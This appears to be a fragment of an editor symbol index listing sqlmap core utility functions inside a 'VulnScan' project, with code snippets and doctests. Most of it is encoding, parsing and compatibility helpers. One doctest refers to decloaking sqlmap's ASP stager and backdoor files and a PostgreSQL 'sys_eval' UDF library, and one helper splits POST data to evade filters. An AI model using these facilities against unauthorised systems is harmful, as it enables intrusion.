        "peekOfCode": "def applyFunctionRecursively(value, function):\n    \"\"\"\n    Applies function recursively through list-like structures\n    >>> applyFunctionRecursively([1, 2, [3, 4, [19]], -9], lambda _: _ > 0)\n    [True, True, [True, True, [True]], False]\n    \"\"\"\n    if isListLike(value):\n        retVal = [applyFunctionRecursively(_, function) for _ in value]\n    else:\n        retVal = function(value)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "decodeDbmsHexValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def decodeDbmsHexValue(value, raw=False):\n    \"\"\"\n    Returns value decoded from DBMS specific hexadecimal representation\n    >>> decodeDbmsHexValue('3132332031') == u'123 1'\n    True\n    >>> decodeDbmsHexValue('313233203') == u'123 ?'\n    True\n    >>> decodeDbmsHexValue(['0x31', '0x32']) == [u'1', u'2']\n    True\n    >>> decodeDbmsHexValue('5.1.41') == u'5.1.41'",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractExpectedValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def extractExpectedValue(value, expected):\n    \"\"\"\n    Extracts and returns expected value by a given type\n    >>> extractExpectedValue(['1'], EXPECTED.BOOL)\n    True\n    >>> extractExpectedValue('1', EXPECTED.INT)\n    1\n    >>> extractExpectedValue('7\\\\xb9645', EXPECTED.INT) is None\n    True\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def hashDBWrite(key, value, serialize=False):\n    \"\"\"\n    Helper function for writing session data to HashDB\n    \"\"\"\n    if conf.hashDB:\n        _ = '|'.join((str(_) if not isinstance(_, six.string_types) else _) for _ in (conf.hostname, conf.path.strip('/') if conf.path is not None else conf.port, key, HASHDB_MILESTONE_VALUE))\n        conf.hashDB.write(_, value, serialize)\ndef hashDBRetrieve(key, unserialize=False, checkConf=False):\n    \"\"\"\n    Helper function for restoring session data from HashDB",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def hashDBRetrieve(key, unserialize=False, checkConf=False):\n    \"\"\"\n    Helper function for restoring session data from HashDB\n    \"\"\"\n    retVal = None\n    if conf.hashDB:\n        _ = '|'.join((str(_) if not isinstance(_, six.string_types) else _) for _ in (conf.hostname, conf.path.strip('/') if conf.path is not None else conf.port, key, HASHDB_MILESTONE_VALUE))\n        retVal = conf.hashDB.retrieve(_, unserialize) if kb.resumeValues and not (checkConf and any((conf.flushSession, conf.freshQueries))) else None\n        if not kb.inferenceMode and not kb.fileReadMode and isinstance(retVal, six.string_types) and any(_ in retVal for _ in (PARTIAL_VALUE_MARKER, PARTIAL_HEX_VALUE_MARKER)):\n            retVal = None",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "resetCookieJar",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def resetCookieJar(cookieJar):\n    \"\"\"\n    Cleans cookies from a given cookie jar\n    \"\"\"\n    if not conf.loadCookies:\n        cookieJar.clear()\n    else:\n        try:\n            if not cookieJar.filename:\n                infoMsg = \"loading cookies from '%s'\" % conf.loadCookies",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "decloakToTemp",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def decloakToTemp(filename):\n    \"\"\"\n    Decloaks content of a given file to a temporary file with similar name and extension\n    NOTE: using in-memory decloak() in docTests because of the \"problem\" on Windows platform\n    >>> decloak(os.path.join(paths.SQLMAP_SHELL_PATH, \"stagers\", \"stager.asp_\")).startswith(b'<%')\n    True\n    >>> decloak(os.path.join(paths.SQLMAP_SHELL_PATH, \"backdoors\", \"backdoor.asp_\")).startswith(b'<%')\n    True\n    >>> b'sys_eval' in decloak(os.path.join(paths.SQLMAP_UDF_PATH, \"postgresql\", \"linux\", \"64\", \"11\", \"lib_postgresqludf_sys.so_\"))\n    True",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "prioritySortColumns",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def prioritySortColumns(columns):\n    \"\"\"\n    Sorts given column names by length in ascending order while those containing\n    string 'id' go first\n    >>> prioritySortColumns(['password', 'userid', 'name'])\n    ['userid', 'name', 'password']\n    \"\"\"\n    def _(column):\n        return column and re.search(r\"^id|id$\", column, re.I) is not None\n    return sorted(sorted(columns, key=len), key=functools.cmp_to_key(lambda x, y: -1 if _(x) and not _(y) else 1 if not _(x) and _(y) else 0))",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getRequestHeader",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getRequestHeader(request, name):\n    \"\"\"\n    Solving an issue with an urllib2 Request header case sensitivity\n    # Reference: http://bugs.python.org/issue2275\n    >>> _ = lambda _: _\n    >>> _.headers = {\"FOO\": \"BAR\"}\n    >>> _.header_items = lambda: _.headers.items()\n    >>> getText(getRequestHeader(_, \"foo\"))\n    'BAR'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumber",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isNumber(value):\n    \"\"\"\n    Returns True if the given value is a number-like object\n    >>> isNumber(1)\n    True\n    >>> isNumber('0')\n    True\n    >>> isNumber('foobar')\n    False\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "zeroDepthSearch",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def zeroDepthSearch(expression, value):\n    \"\"\"\n    Searches occurrences of value inside expression at 0-depth level\n    regarding the parentheses\n    >>> _ = \"SELECT (SELECT id FROM users WHERE 2>1) AS result FROM DUAL\"; _[zeroDepthSearch(_, \"FROM\")[0]:]\n    'FROM DUAL'\n    >>> _ = \"a(b; c),d;e\"; _[zeroDepthSearch(_, \"[;, ]\")[0]:]\n    ',d;e'\n    \"\"\"\n    retVal = []",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "splitFields",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def splitFields(fields, delimiter=','):\n    \"\"\"\n    Returns list of (0-depth) fields splitted by delimiter\n    >>> splitFields('foo, bar, max(foo, bar)')\n    ['foo', 'bar', 'max(foo,bar)']\n    \"\"\"\n    fields = fields.replace(\"%s \" % delimiter, delimiter)\n    commas = [-1, len(fields)]\n    commas.extend(zeroDepthSearch(fields, ','))\n    commas = sorted(commas)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "pollProcess",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def pollProcess(process, suppress_errors=False):\n    \"\"\"\n    Checks for process status (prints . if still running)\n    \"\"\"\n    while process:\n        dataToStdout(\".\")\n        time.sleep(1)\n        returncode = process.poll()\n        if returncode is not None:\n            if not suppress_errors:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseRequestFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def parseRequestFile(reqFile, checkParams=True):\n    \"\"\"\n    Parses WebScarab and Burp logs and adds results to the target URL list\n    >>> handle, reqFile = tempfile.mkstemp(suffix=\".req\")\n    >>> content = b\"POST / HTTP/1.0\\\\nUser-agent: foobar\\\\nHost: www.example.com\\\\n\\\\nid=1\\\\n\"\n    >>> _ = os.write(handle, content)\n    >>> os.close(handle)\n    >>> next(parseRequestFile(reqFile)) == ('http://www.example.com:80/', 'POST', 'id=1', None, (('User-agent', 'foobar'), ('Host', 'www.example.com')))\n    True\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getSafeExString(ex, encoding=None):\n    \"\"\"\n    Safe way how to get the proper exception represtation as a string\n    >>> getSafeExString(SqlmapBaseException('foobar')) == 'foobar'\n    True\n    >>> getSafeExString(OSError(0, 'foobar')) == 'OSError: foobar'\n    True\n    \"\"\"\n    retVal = None\n    if getattr(ex, \"message\", None):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeVariableNaming",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def safeVariableNaming(value):\n    \"\"\"\n    Returns escaped safe-representation of a given variable name that can be used in Python evaluated code\n    >>> safeVariableNaming(\"class.id\") == \"EVAL_636c6173732e6964\"\n    True\n    \"\"\"\n    if value in keyword.kwlist or re.search(r\"\\A[^a-zA-Z]|[^\\w]\", value):\n        value = \"%s%s\" % (EVALCODE_ENCODED_PREFIX, getUnicode(binascii.hexlify(getBytes(value))))\n    return value\ndef unsafeVariableNaming(value):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "unsafeVariableNaming",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def unsafeVariableNaming(value):\n    \"\"\"\n    Returns unescaped safe-representation of a given variable name\n    >>> unsafeVariableNaming(\"EVAL_636c6173732e6964\") == \"class.id\"\n    True\n    \"\"\"\n    if value.startswith(EVALCODE_ENCODED_PREFIX):\n        value = decodeHex(value[len(EVALCODE_ENCODED_PREFIX):], binary=False)\n    return value\ndef firstNotNone(*args):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "firstNotNone",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def firstNotNone(*args):\n    \"\"\"\n    Returns first not-None value from a given list of arguments\n    >>> firstNotNone(None, None, 1, 2, 3)\n    1\n    \"\"\"\n    retVal = None\n    for _ in args:\n        if _ is not None:\n            retVal = _",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "removePostHintPrefix",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def removePostHintPrefix(value):\n    \"\"\"\n    Remove POST hint prefix from a given value (name)\n    >>> removePostHintPrefix(\"JSON id\")\n    'id'\n    >>> removePostHintPrefix(\"id\")\n    'id'\n    \"\"\"\n    return re.sub(r\"\\A(%s) \" % '|'.join(re.escape(__) for __ in getPublicTypeMembers(POST_HINT, onlyValues=True)), \"\", value)\ndef chunkSplitPostData(data):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "chunkSplitPostData",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def chunkSplitPostData(data):\n    \"\"\"\n    Convert POST data to chunked transfer-encoded data (Note: splitting done by SQL keywords)\n    >>> random.seed(0)\n    >>> chunkSplitPostData(\"SELECT username,password FROM users\")\n    '5;4Xe90\\\\r\\\\nSELEC\\\\r\\\\n3;irWlc\\\\r\\\\nT u\\\\r\\\\n1;eT4zO\\\\r\\\\ns\\\\r\\\\n5;YB4hM\\\\r\\\\nernam\\\\r\\\\n9;2pUD8\\\\r\\\\ne,passwor\\\\r\\\\n3;mp07y\\\\r\\\\nd F\\\\r\\\\n5;8RKXi\\\\r\\\\nROM u\\\\r\\\\n4;MvMhO\\\\r\\\\nsers\\\\r\\\\n0\\\\r\\\\n\\\\r\\\\n'\n    \"\"\"\n    length = len(data)\n    retVal = \"\"\n    index = 0",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "WichmannHill",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.compat",
        "description": "VulnScan.modules.sqlmap.lib.core.compat",
        "peekOfCode": "class WichmannHill(random.Random):\n    \"\"\"\n    Reference: https://svn.python.org/projects/python/trunk/Lib/random.py\n    \"\"\"\n    VERSION = 1     # used by getstate/setstate\n    def seed(self, a=None):\n        \"\"\"Initialize internal state from hashable object.\n        None or no argument seeds from current time or from an operating\n        system specific randomness source if available.\n        If a is not None or an int or long, hash(a) is used instead.",
        "detail": "VulnScan.modules.sqlmap.lib.core.compat",
        "documentation": {}
    },
    {
        "label": "patchHeaders",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.compat",
        "description": "VulnScan.modules.sqlmap.lib.core.compat",
        "peekOfCode": "def patchHeaders(headers):\n    if headers is not None and not hasattr(headers, \"headers\"):\n        if isinstance(headers, dict):\n            class _(dict):\n                def __getitem__(self, key):\n                    for key_ in self:\n                        if key_.lower() == key.lower():\n                            return super(_, self).__getitem__(key_)\n                    raise KeyError(key)\n                def get(self, key, default=None):",
        "detail": "VulnScan.modules.sqlmap.lib.core.compat",
        "documentation": {}
    },
    {
        "label": "cmp",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.compat",
        "description": "VulnScan.modules.sqlmap.lib.core.compat",
        "peekOfCode": "def cmp(a, b):\n    \"\"\"\n    >>> cmp(\"a\", \"b\")\n    -1\n    >>> cmp(2, 1)\n    1\n    \"\"\"\n    if a < b:\n        return -1\n    elif a > b:",
        "detail": "VulnScan.modules.sqlmap.lib.core.compat",
        "documentation": {}
    },
    {
        "label": "choose_boundary",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.compat",
        "description": "VulnScan.modules.sqlmap.lib.core.compat",
        "peekOfCode": "def choose_boundary():\n    \"\"\"\n    >>> len(choose_boundary()) == 32\n    True\n    \"\"\"\n    retval = \"\"\n    try:\n        retval = uuid.uuid4().hex\n    except AttributeError:\n        retval = \"\".join(random.sample(\"0123456789abcdef\", 1)[0] for _ in xrange(32))",
        "detail": "VulnScan.modules.sqlmap.lib.core.compat",
        "documentation": {}
    },
    {
        "label": "round",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.compat",
        "description": "VulnScan.modules.sqlmap.lib.core.compat",
        "peekOfCode": "def round(x, d=0):\n    \"\"\"\n    >>> round(2.0)\n    2.0\n    >>> round(2.5)\n    3.0\n    \"\"\"\n    p = 10 ** d\n    if x > 0:\n        return float(math.floor((x * p) + 0.5)) / p",
        "detail": "VulnScan.modules.sqlmap.lib.core.compat",
        "documentation": {}
    },
    {
        "label": "cmp_to_key",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.compat",
        "description": "VulnScan.modules.sqlmap.lib.core.compat",
        "peekOfCode": "def cmp_to_key(mycmp):\n    \"\"\"Convert a cmp= function into a key= function\"\"\"\n    class K(object):\n        __slots__ = ['obj']\n        def __init__(self, obj, *args):\n            self.obj = obj\n        def __lt__(self, other):\n            return mycmp(self.obj, other.obj) < 0\n        def __gt__(self, other):\n            return mycmp(self.obj, other.obj) > 0",
        "detail": "VulnScan.modules.sqlmap.lib.core.compat",
        "documentation": {}
    },
    {
        "label": "LooseVersion",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.compat",
        "description": "VulnScan.modules.sqlmap.lib.core.compat",
        "peekOfCode": "def LooseVersion(version):\n    \"\"\"\n    >>> LooseVersion(\"1.0\") == LooseVersion(\"1.0\")\n    True\n    >>> LooseVersion(\"1.0.1\") > LooseVersion(\"1.0\")\n    True\n    >>> LooseVersion(\"1.0.1-\") == LooseVersion(\"1.0.1\")\n    True\n    >>> LooseVersion(\"1.0.11\") < LooseVersion(\"1.0.111\")\n    True",
        "detail": "VulnScan.modules.sqlmap.lib.core.compat",
        "documentation": {}
    },
    {
        "label": "base64pickle",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def base64pickle(value):\n    \"\"\"\n    Serializes (with pickle) and encodes to Base64 format supplied (binary) value\n    >>> base64unpickle(base64pickle([1, 2, 3])) == [1, 2, 3]\n    True\n    \"\"\"\n    retVal = None\n    try:\n        retVal = encodeBase64(pickle.dumps(value, PICKLE_PROTOCOL), binary=False)\n    except:",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "base64unpickle",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def base64unpickle(value):\n    \"\"\"\n    Decodes value from Base64 to plain format and deserializes (with pickle) its content\n    >>> type(base64unpickle('gAJjX19idWlsdGluX18Kb2JqZWN0CnEBKYFxAi4=')) == object\n    True\n    \"\"\"\n    retVal = None\n    try:\n        retVal = pickle.loads(decodeBase64(value))\n    except TypeError:",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "htmlUnescape",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def htmlUnescape(value):\n    \"\"\"\n    Returns (basic conversion) HTML unescaped value\n    >>> htmlUnescape('a&lt;b') == 'a<b'\n    True\n    \"\"\"\n    retVal = value\n    if value and isinstance(value, six.string_types):\n        replacements = ((\"&lt;\", '<'), (\"&gt;\", '>'), (\"&quot;\", '\"'), (\"&nbsp;\", ' '), (\"&amp;\", '&'), (\"&apos;\", \"'\"))\n        for code, value in replacements:",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def singleTimeWarnMessage(message):  # Cross-referenced function\n    sys.stdout.write(message)\n    sys.stdout.write(\"\\n\")\n    sys.stdout.flush()\ndef filterNone(values):  # Cross-referenced function\n    return [_ for _ in values if _] if isinstance(values, _collections.Iterable) else values\ndef isListLike(value):  # Cross-referenced function\n    return isinstance(value, (list, tuple, set, BigArray))\ndef shellExec(cmd):  # Cross-referenced function\n    raise NotImplementedError",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def filterNone(values):  # Cross-referenced function\n    return [_ for _ in values if _] if isinstance(values, _collections.Iterable) else values\ndef isListLike(value):  # Cross-referenced function\n    return isinstance(value, (list, tuple, set, BigArray))\ndef shellExec(cmd):  # Cross-referenced function\n    raise NotImplementedError\ndef jsonize(data):\n    \"\"\"\n    Returns JSON serialized data\n    >>> jsonize({'foo':'bar'})",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def isListLike(value):  # Cross-referenced function\n    return isinstance(value, (list, tuple, set, BigArray))\ndef shellExec(cmd):  # Cross-referenced function\n    raise NotImplementedError\ndef jsonize(data):\n    \"\"\"\n    Returns JSON serialized data\n    >>> jsonize({'foo':'bar'})\n    '{\\\\n    \"foo\": \"bar\"\\\\n}'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "shellExec",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def shellExec(cmd):  # Cross-referenced function\n    raise NotImplementedError\ndef jsonize(data):\n    \"\"\"\n    Returns JSON serialized data\n    >>> jsonize({'foo':'bar'})\n    '{\\\\n    \"foo\": \"bar\"\\\\n}'\n    \"\"\"\n    return json.dumps(data, sort_keys=False, indent=4)\ndef dejsonize(data):",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "jsonize",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def jsonize(data):\n    \"\"\"\n    Returns JSON serialized data\n    >>> jsonize({'foo':'bar'})\n    '{\\\\n    \"foo\": \"bar\"\\\\n}'\n    \"\"\"\n    return json.dumps(data, sort_keys=False, indent=4)\ndef dejsonize(data):\n    \"\"\"\n    Returns JSON deserialized data",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "dejsonize",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def dejsonize(data):\n    \"\"\"\n    Returns JSON deserialized data\n    >>> dejsonize('{\\\\n    \"foo\": \"bar\"\\\\n}') == {u'foo': u'bar'}\n    True\n    \"\"\"\n    return json.loads(data)\ndef decodeHex(value, binary=True):\n    \"\"\"\n    Returns a decoded representation of provided hexadecimal value",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeHex",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def decodeHex(value, binary=True):\n    \"\"\"\n    Returns a decoded representation of provided hexadecimal value\n    >>> decodeHex(\"313233\") == b\"123\"\n    True\n    >>> decodeHex(\"313233\", binary=False) == u\"123\"\n    True\n    \"\"\"\n    retVal = value\n    if isinstance(value, six.binary_type):",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeHex",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def encodeHex(value, binary=True):\n    \"\"\"\n    Returns a encoded representation of provided string value\n    >>> encodeHex(b\"123\") == b\"313233\"\n    True\n    >>> encodeHex(\"123\", binary=False)\n    '313233'\n    >>> encodeHex(b\"123\"[0]) == b\"31\"\n    True\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeBase64",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def decodeBase64(value, binary=True, encoding=None):\n    \"\"\"\n    Returns a decoded representation of provided Base64 value\n    >>> decodeBase64(\"MTIz\") == b\"123\"\n    True\n    >>> decodeBase64(\"MTIz\", binary=False)\n    '123'\n    >>> decodeBase64(\"A-B_CDE\") == decodeBase64(\"A+B/CDE\")\n    True\n    >>> decodeBase64(b\"MTIzNA\") == b\"1234\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeBase64",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def encodeBase64(value, binary=True, encoding=None, padding=True, safe=False):\n    \"\"\"\n    Returns a decoded representation of provided Base64 value\n    >>> encodeBase64(b\"123\") == b\"MTIz\"\n    True\n    >>> encodeBase64(u\"1234\", binary=False)\n    'MTIzNA=='\n    >>> encodeBase64(u\"1234\", binary=False, padding=False)\n    'MTIzNA'\n    >>> encodeBase64(decodeBase64(\"A-B_CDE\"), binary=False, safe=True)",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def getBytes(value, encoding=None, errors=\"strict\", unsafe=True):\n    \"\"\"\n    Returns byte representation of provided Unicode value\n    >>> getBytes(u\"foo\\\\\\\\x01\\\\\\\\x83\\\\\\\\xffbar\") == b\"foo\\\\x01\\\\x83\\\\xffbar\"\n    True\n    \"\"\"\n    retVal = value\n    if encoding is None:\n        encoding = conf.get(\"encoding\") or UNICODE_ENCODING\n    try:",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def getOrds(value):\n    \"\"\"\n    Returns ORD(...) representation of provided string value\n    >>> getOrds(u'fo\\\\xf6bar')\n    [102, 111, 246, 98, 97, 114]\n    >>> getOrds(b\"fo\\\\xc3\\\\xb6bar\")\n    [102, 111, 195, 182, 98, 97, 114]\n    \"\"\"\n    return [_ if isinstance(_, int) else ord(_) for _ in value]\ndef getUnicode(value, encoding=None, noneToNull=False):",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def getUnicode(value, encoding=None, noneToNull=False):\n    \"\"\"\n    Returns the unicode representation of the supplied value\n    >>> getUnicode('test') == u'test'\n    True\n    >>> getUnicode(1) == u'1'\n    True\n    >>> getUnicode(None) == 'None'\n    True\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def getText(value, encoding=None):\n    \"\"\"\n    Returns textual value of a given value (Note: not necessary Unicode on Python2)\n    >>> getText(b\"foobar\")\n    'foobar'\n    >>> isinstance(getText(u\"fo\\\\u2299bar\"), six.text_type)\n    True\n    \"\"\"\n    retVal = value\n    if isinstance(value, six.binary_type):",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "stdoutEncode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def stdoutEncode(value):\n    \"\"\"\n    Returns binary representation of a given Unicode value safe for writing to stdout\n    \"\"\"\n    value = value or \"\"\n    if IS_WIN and IS_TTY and kb.get(\"codePage\", -1) is None:\n        output = shellExec(\"chcp\")\n        match = re.search(r\": (\\d{3,})\", output or \"\")\n        if match:\n            try:",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getConsoleLength",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.convert",
        "description": "VulnScan.modules.sqlmap.lib.core.convert",
        "peekOfCode": "def getConsoleLength(value):\n    \"\"\"\n    Returns console width of unicode values\n    >>> getConsoleLength(\"abc\")\n    3\n    >>> getConsoleLength(u\"\\\\u957f\\\\u6c5f\")\n    4\n    \"\"\"\n    if isinstance(value, six.text_type):\n        retVal = sum((2 if ord(_) >= 0x3000 else 1) for _ in value)",
        "detail": "VulnScan.modules.sqlmap.lib.core.convert",
        "documentation": {}
    },
    {
        "label": "paths",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.data",
        "description": "VulnScan.modules.sqlmap.lib.core.data",
        "peekOfCode": "paths = AttribDict()\n# object to store original command line options\ncmdLineOptions = AttribDict()\n# object to store merged options (command line, configuration file and default options)\nmergedOptions = AttribDict()\n# object to share within function and classes command\n# line options and settings\nconf = AttribDict()\n# object to share within function and classes results\nkb = AttribDict()",
        "detail": "VulnScan.modules.sqlmap.lib.core.data",
        "documentation": {}
    },
    {
        "label": "cmdLineOptions",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.data",
        "description": "VulnScan.modules.sqlmap.lib.core.data",
